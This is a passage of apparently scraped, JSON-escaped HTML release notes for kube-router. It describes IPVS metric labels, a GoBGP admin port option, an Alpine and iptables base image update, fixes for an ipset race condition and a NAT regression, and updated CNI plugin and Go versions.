This allows for more fine-grained and up-to-date metrics on IPVS services. (Thanks <a class=\"user-mention notranslate\" href=\"https://github.com/rkojedzinszky\">@rkojedzinszky</a>!)</li>\n<li>Service's <code>externalIP</code> and <code>LoadBalancerIP</code> are now labels on IPVS metrics which can increase cardinality, but also provides better visibility for services. Prior to this, only the <code>ClusterIP</code> or <code>NodePort</code> labels were added to metrics.</li>\n<li>The GoBGP port can be changed or disabled via <code>--gpbgp-admin-port</code> to create more secure / flexible deployments of kube-router</li>\n<li>We converted a lot of exec's  out to <code>iproute2</code> into <code>netlink</code> library calls, making the code more idiomatic, faster, and less fragile to userspace tooling changes</li>\n<li>When both DSR and Maglev is enabled on a service kube-router will automatically enable the kernel option <code>sloppy_tcp</code> for IPVS which allows for greater service routing consistency when transitioning nodes (Thanks <a class=\"user-mention notranslate\" href=\"https://github.com/AnupamGhosh\">@AnupamGhosh</a>!)</li>\n<li>All references to Endpoints has been removed since the API is now fully deprecated and EndpointSlices is now used behind the scenes</li>\n</ul>\n<h3>Fixed Issues</h3>\n<ul>\n<li><a href=\"https://github.com/cloudnativelabs/kube-router/issues/1895\">1895</a> -

      "summary": "<h2>Summary</h2>\n<p>This update is mainly a dependency and docker image base update. For a long time, kube-router has been stalled on Alpine 3.18 because of a breaking change with the upstream iptables user space. However, this was fixed in <code>iptables-1.8.11</code> which was released in November and then was integrated into Alpine 3.21 early this Month. See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1789\">#1789</a> for more information.</p>\n<p>This should make kube-router much more tolerant of iptables / nftables rules added by recent versions of the netfilter userspaces.</p>\n<p>This release does contain a few prominent fixes since the last release of v2.4.1:</p>\n<ul>\n<li><code>ipset.Save()</code> was introduced at the start of the NetworkPolicyController resolving a race condition between the NetworkPolicyController (<code>--run-firewall</code>) and the NetworkServiceController (<code>--run-service-proxy</code>). See <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/pull/1806\">#1806</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/alexcriss\">@alexcriss</a> for reporting this and being patient while we tried to reproduce)</li>\n<li>Internal cluster traffic is now properly excluded from NAT conditions which resolves a regression that was introduced in the v2.3 release line. See: <a class=\"issue-link js-issue-link\" href=\"https://github.com/cloudnativelabs/kube-router/issues/1778\">#1778</a> (thanks <a class=\"user-mention notranslate\" href=\"https://github.com/zerkms\">@zerkms</a> for reporting this)</li>\n</ul>\n<p>Other major dependency updates:</p>\n<ul>\n<li>Bundled CNI plugins have been updated from v1.4.0 -&gt; v1.6.2</li>\n<li>Go version has been updated from v1.22.3 -&gt; v1.23.6</li>\n</ul>\n<h2>Contributions</h2>\n<p>Special thanks to <a class=\"user-mention notranslate\" href=\"https://github.com/rbrtbnfgl\">@rbrtbnfgl</a> and <a class=\"user-mention notranslate\" href=\"https://github.com/dsseng\">@dsseng</a> for their contributions to this release!</p>\n<h2>Changelog</h2>\n<ul>\n<li><a class=\"commit-link\" href=\"https://github.com/cloudnativelabs/kube-router/commit/85e429e9c72b2bc7de93b5f1bcce20e7c924386d\"><tt>85e429e</tt></a> -
